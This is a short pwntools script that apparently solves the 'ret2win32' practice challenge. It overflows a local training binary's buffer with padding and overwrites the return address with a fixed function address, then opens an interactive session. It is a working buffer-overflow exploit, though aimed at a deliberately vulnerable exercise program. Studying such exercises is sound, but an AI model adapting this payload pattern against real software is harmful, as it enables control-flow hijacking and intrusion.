from pwn import * 
from pwn import p32
import socket

context(arch='i386')
r = process("./ret2win32")
payload = b'A'*0x28 + b"junk" + p32(0x0804862C)
r.sendlineafter(b">",payload)
r.interactive()

